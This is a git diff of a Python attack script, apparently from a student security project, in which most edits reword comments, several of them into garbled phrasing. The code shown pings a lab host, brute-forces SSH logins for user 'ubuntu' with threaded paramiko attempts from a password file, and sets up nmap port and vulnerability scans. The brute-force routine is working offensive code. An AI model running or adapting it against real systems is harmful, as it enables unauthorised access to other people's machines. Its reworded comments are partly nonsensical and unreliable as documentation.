@@ -1,10 +1,11 @@
-#First implementation - Dragan Butkovic -P2408503
+# MSA implementation script - Dragan Butkovic -P2408503
 
-# IMPORTANT NOTE: Install Python PIP on Linux for a package management systems that simplifies installation 
-# and mangement of software packages written in Python such as those found in the Python pacakage index (PyPI). 
-# Pip is not installed by default on Ubuntu 18.04, but the installation is pretty straightforward.
+# Pip Installs Packages (PIP) is a tool with the capability that allows user
+# to install software packages written in Python. This package managing
+# system is used to download and set up packages from Python Package Index 
+# PyPI. Installing PIP on Ubuntu 18.04 simple process.  
 
-# SHOULD INSTALL PIP and PIP PACKAGES 
+# INSTALLING PIP and PIP PACKAGES 
 # sudo apt install python3-pip
 # sudo pip3 install termcolor
 # sudo pip3 install paramiko
@@ -23,7 +24,7 @@ from termcolor import colored
 
 #-------------------------------------------------FPing---------------------------------------------------------------#
 
-#Perform the ping using the system ping the host (victims) (15 ping only) 
+#Execution of the ping using the system ping the host (victims) (15 ping only) 
 os.system('ping 192.168.253.136 -c 15')
 print("pfing Done!")
 
@@ -39,15 +40,15 @@ time.sleep(2)
 target_ip = "192.168.253.136"
 username = "ubuntu"
 password_file = "passwords.txt"
-#Grabing the required variables....
+#Grasping the required variables....
 
-#Defning A SSH connect Function to start SSH session Against Target...
+#Setting A SSH join Function to start SSH period Against Target...
 def ssh_connect(password, code=0):
   global exit_tag
   ssh = paramiko.SSHClient()
   ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-#checking for each correct password in List 
+#read-through for each accurate password in List 
   try:
     ssh.connect(target_ip, port=22, username=username, password=password)
     exit_tag = 1
@@ -60,25 +61,25 @@ def ssh_connect(password, code=0):
   ssh.close()
   return code
 
-#Checking that if the specified password File exists
+#Experimenting if the identified password File exists
 if os.path.exists(password_file) == False:
   print(colored("[!] File Not Found", 'red'))
   sys.exit(1)
 
-#Reading For Passwords From the Specified password File..!
+#Reading Passwords From the Indicated password File..!
 with open(password_file, 'r') as file:
   for line in file.readlines():
     if exit_tag == 1:
       t.join()
-      #Joining the Threads in-case we found a correct password..
+      #Joining the Threads in-case a correct password is found
       exit()
     password = line.strip()
     t = threading.Thread(target=ssh_connect, args=(password,))
     t.start()
-    #starting threading on ssh_connect function which takes only one argument of password...
+    #beginning to make way on ssh_connect function which takes only one argument of password...
     time.sleep(0.3)
-    #time in seconds between each successive thread//Don't change it unless very neccessary...!
-    #Lowering this time value may cause some errors......!
+   #time in seconds between each sequential thread//It should not be changed except if it became compulsory 
+    #Lowering this time value might cause some faults......!
 
 print("Brute-Force-SHH_Completed")
 #-------------------------------------------------NSE-port-scan----------------------------------------------------#
@@ -89,7 +90,7 @@ print("NSE Done!")
 
 #-------------------------------------------------NSE-vulnerability-scan-------------------------------------------#
 
-#installing the vulscan script from git clone https://github.com/mrxdragan95/CTEC3451_2021_520_Development-Project.git
+#Installing the vulscan script from git clone https://github.com/mrxdragan95/CTEC3451_2021_520_Development-Project.git
 def vulscan():
     os.system('ln -s `pwd`/vulscan /usr/share/nmap/scripts/vulscan')
     print("Moving_to_Script-Vulscan.nse")
